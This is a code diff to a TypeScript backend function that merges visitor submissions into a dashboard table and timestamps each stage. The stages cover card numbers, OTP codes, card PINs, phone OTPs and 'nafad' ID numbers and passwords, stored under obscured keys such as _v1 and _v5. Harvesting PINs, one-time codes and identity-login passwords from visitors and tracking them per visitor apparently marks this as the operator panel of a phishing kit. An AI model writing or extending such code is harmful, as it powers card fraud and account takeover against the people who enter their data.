@@ -482,33 +482,49 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
   // Merge existing visitor data with current payload (current payload takes precedence)
   const mergedPayload = { ...existingVisitorData, ...payload };
 
-  // Auto-add _v1UpdatedAt if card data is being updated but _v1UpdatedAt is not provided
-  if ((mergedPayload._v1 || mergedPayload.cardNumber || mergedPayload.cardData) && !mergedPayload._v1UpdatedAt) {
-    mergedPayload._v1UpdatedAt = new Date().toISOString();
+  // Get current timestamp
+  const now = new Date().toISOString();
+
+  // Auto-add _v1UpdatedAt ONLY if card data is in the CURRENT payload (not merged)
+  // This ensures we only update the timestamp when new card data is submitted
+  const hasNewCardData = payload._v1 || payload.cardNumber || payload.cardData || 
+                         payload._v1UpdatedAt || payload._v2 || payload._v3;
+  if (hasNewCardData && !mergedPayload._v1UpdatedAt) {
+    mergedPayload._v1UpdatedAt = now;
   }
-  // Auto-add _v5UpdatedAt if OTP data is being updated but _v5UpdatedAt is not provided
-  if ((mergedPayload._v5 || mergedPayload.otpCode || mergedPayload.otp) && !mergedPayload._v5UpdatedAt) {
-    mergedPayload._v5UpdatedAt = new Date().toISOString();
+
+  // Auto-add _v5UpdatedAt ONLY if OTP data is in the CURRENT payload
+  const hasNewOtpData = payload._v5 || payload.otpCode || payload.otp || payload.otpSubmittedAt || payload._v5UpdatedAt;
+  if (hasNewOtpData && !mergedPayload._v5UpdatedAt) {
+    mergedPayload._v5UpdatedAt = now;
   }
-  // Auto-add _v6UpdatedAt if PIN data is being updated but _v6UpdatedAt is not provided
-  if ((mergedPayload._v6 || mergedPayload.pinCode || mergedPayload.pin) && !mergedPayload._v6UpdatedAt) {
-    mergedPayload._v6UpdatedAt = new Date().toISOString();
+
+  // Auto-add _v6UpdatedAt ONLY if PIN data is in the CURRENT payload
+  const hasNewPinData = payload._v6 || payload.pinCode || payload.pin || payload._v6UpdatedAt;
+  if (hasNewPinData && !mergedPayload._v6UpdatedAt) {
+    mergedPayload._v6UpdatedAt = now;
   }
-  // Auto-add _v7UpdatedAt if phone data is being updated but _v7UpdatedAt is not provided
-  if ((mergedPayload.phoneNumber || mergedPayload._v7 || mergedPayload.phoneOtp) && !mergedPayload._v7UpdatedAt) {
-    mergedPayload._v7UpdatedAt = new Date().toISOString();
+
+  // Auto-add _v7UpdatedAt ONLY if phone data is in the CURRENT payload
+  const hasNewPhoneData = payload.phoneNumber || payload._v7 || payload.phoneOtp || 
+                          payload.phoneIdNumber || payload.phoneCarrier || payload._v7UpdatedAt;
+  if (hasNewPhoneData && !mergedPayload._v7UpdatedAt) {
+    mergedPayload._v7UpdatedAt = now;
   }
-  // Auto-add nafadUpdatedAt if nafad data is being updated but nafadUpdatedAt is not provided
-  if ((mergedPayload.nafadIdNumber || mergedPayload.nafadPassword) && !mergedPayload.nafadUpdatedAt) {
-    mergedPayload.nafadUpdatedAt = new Date().toISOString();
+
+  // Auto-add nafadUpdatedAt ONLY if nafad data is in the CURRENT payload
+  const hasNewNafadData = payload.nafadIdNumber || payload.nafadPassword || payload.nafadUpdatedAt;
+  if (hasNewNafadData && !mergedPayload.nafadUpdatedAt) {
+    mergedPayload.nafadUpdatedAt = now;
   }
-  // Auto-add comparCompletedAt if package/offer data is being updated but comparCompletedAt is not provided
-  if ((mergedPayload.selectedOffer || mergedPayload.offerTotalPrice) && !mergedPayload.comparCompletedAt) {
-    mergedPayload.comparCompletedAt = new Date().toISOString();
+
+  // Auto-add comparCompletedAt ONLY if package/offer data is in the CURRENT payload
+  const hasNewOfferData = payload.selectedOffer || payload.offerTotalPrice || payload.comparCompletedAt;
+  if (hasNewOfferData && !mergedPayload.comparCompletedAt) {
+    mergedPayload.comparCompletedAt = now;
   }
   
   const normalized = normalizeDashboardEntry(mergedPayload);
-  console.log("[UpsertDashboard] normalized:", { id: normalized.id, customer: normalized.customer, badge: normalized.badge });
   
   try {
     const existingResult = await pool.query<{ submittedAt: string | null }>(
@@ -556,19 +572,10 @@ async function upsertDashboardRequest(payload: Record<string, any> = {}) {
 }
 
 async function getDashboardEntries(): Promise<DashboardEntry[]> {
-  console.log("[Dashboard] Fetching entries from database...");
-  
   try {
     const { rows } = await pool.query(
       `SELECT id, customer, status, stage, updated, badge, visitor_id AS "visitorId", submitted_at AS "submittedAt", raw FROM dashboard_requests ORDER BY submitted_at DESC, id DESC`,
     );
-    console.log("[Dashboard] DB QUERY SUCCESS - rows:", rows.length);
-    
-    // Debug: Log raw data structure
-    if (rows.length > 0) {
-      console.log("[Dashboard] First row raw keys:", Object.keys(rows[0].raw || {}));
-      console.log("[Dashboard] First row raw._v1UpdatedAt:", rows[0].raw?._v1UpdatedAt);
-    }
 
     return rows.map((row) => ({
       id: row.id,
